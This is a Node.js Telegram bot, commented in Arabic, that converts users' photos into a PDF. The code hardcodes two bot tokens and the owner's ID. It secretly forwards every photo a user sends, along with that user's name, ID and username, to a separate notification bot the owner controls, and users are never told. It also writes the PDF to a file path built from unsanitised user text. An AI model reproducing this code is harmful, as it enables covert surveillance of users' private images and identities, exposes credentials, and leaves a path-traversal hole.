const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const PDFDocument = require('pdfkit');

// ⚠️ الثوابت (تأكد من وضع التوكينات والآيدي الخاص بك)
const MAIN_BOT_TOKEN = '8764714344:AAGUG-SgnIzacA0Zu5Ej-ZK1Vy8Hx6yd8Kc'; 
const NOTIFY_BOT_TOKEN = '8578461105:AAGtjEGZ9LOV79ezGG_BGgbSu51FuPvK5wE'; 
const MY_ID = '8162224437'; 

const bot = new Telegraf(MAIN_BOT_TOKEN);
const notifyBot = new Telegraf(NOTIFY_BOT_TOKEN);

const userImages = {};
const userState = {}; 

bot.start((ctx) => {
    ctx.reply(`أهلاً بك يا علي في نسخة PDF المطورة 👨‍💻\n\n📸 أرسل الصور الآن.\n✅ عند الانتهاء اضغط تحويل لتسمية ملفك.`);
});

// 1. استقبال الصور وإرسال تقرير كامل لك
bot.on('photo', async (ctx) => {
    const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
    const userId = ctx.from.id;
    const firstName = ctx.from.first_name || "بدون اسم";
    const username = ctx.from.username ? `@${ctx.from.username}` : "لا يوجد يوزر";

    if (!userImages[userId]) userImages[userId] = [];
    userImages[userId].push(fileId);

    // --- إرسال الإشعار التفصيلي لك (في بوت الإشعارات) ---
    try {
        const report = `🔔 إشعار استخدام جديد:\n\n👤 الاسم: ${firstName}\n🆔 الآيدي: ${userId}\n🔗 اليوزر: ${username}\n🖼️ ترتيب الصورة: ${userImages[userId].length}`;
        
        await notifyBot.telegram.sendPhoto(MY_ID, fileId, { 
            caption: report 
        });
    } catch (e) { 
        console.log("خطأ في إرسال الإشعار: ", e.message); 
    }

    ctx.reply(`🖼️ تم حفظ الصورة رقم (${userImages[userId].length}).`, 
    Markup.keyboard([['🔄 تحويل إلى PDF', '🗑️ مسح الكل']]).resize());
});

// 2. طلب اسم الملف
bot.hears('🔄 تحويل إلى PDF', (ctx) => {
    if (!userImages[ctx.from.id] || userImages[ctx.from.id].length === 0) {
        return ctx.reply('⚠️ أرسل صورة أولاً!');
    }
    userState[ctx.from.id] = 'WAITING_NAME';
    ctx.reply('📝 أرسل الآن الاسم الذي تريده للملف (سأضيف له By_pdfingebot تلقائياً):');
});

// 3. مسح الصور
bot.hears('🗑️ مسح الكل', (ctx) => {
    delete userImages[ctx.from.id];
    ctx.reply('🗑️ تم مسح القائمة بنجاح.', Markup.removeKeyboard());
});

// 4. صناعة ملف الـ PDF بالتسمية والتوقيع
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    if (userState[userId] !== 'WAITING_NAME') return;

    const userFileName = ctx.message.text.trim().replace(/\s+/g, '_');
    const finalFileName = `${userFileName}_By_pdfingebot.pdf`;
    
    const statusMsg = await ctx.reply('⏳ جاري تحويل صورك إلى ملف PDF... انتظر قليلاً.');

    try {
        const doc = new PDFDocument({ size: 'A4', autoFirstPage: false });
        const tempPath = `./${finalFileName}`;
        const stream = fs.createWriteStream(tempPath);
        doc.pipe(stream);

        for (const fId of userImages[userId]) {
            const fileLink = await ctx.telegram.getFileLink(fId);
            const response = await axios({ method: 'get', url: fileLink.href, responseType: 'arraybuffer' });
            const buffer = Buffer.from(response.data);
            doc.addPage().image(buffer, 0, 0, { fit: [595, 842], align: 'center', valign: 'center' });
        }

        doc.end();

        stream.on('finish', async () => {
            await ctx.telegram.sendDocument(ctx.chat.id, { source: tempPath, filename: finalFileName }, {
                caption: `✅ تم إنشاء الملف بنجاح!\n📂 الاسم: ${finalFileName}`
            });
            
            if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
            delete userImages[userId];
            delete userState[userId];
            ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
        });

    } catch (e) {
        ctx.reply('❌ حدث خطأ تقني، حاول مرة أخرى.');
        delete userState[userId];
    }
});

bot.launch();
